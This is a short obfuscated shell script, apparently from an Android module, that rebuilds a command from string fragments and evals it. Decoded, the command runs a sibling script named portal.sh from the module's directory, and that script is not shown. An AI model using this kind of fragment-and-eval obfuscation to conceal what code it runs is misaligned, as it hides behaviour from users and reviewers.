z="
";Gz='port';Bz='IR=$';Dz='*}';Az='MODD';Cz='{0%/';Iz='h';Hz='al.s';Fz='DIR/';Ez='$MOD';
eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz"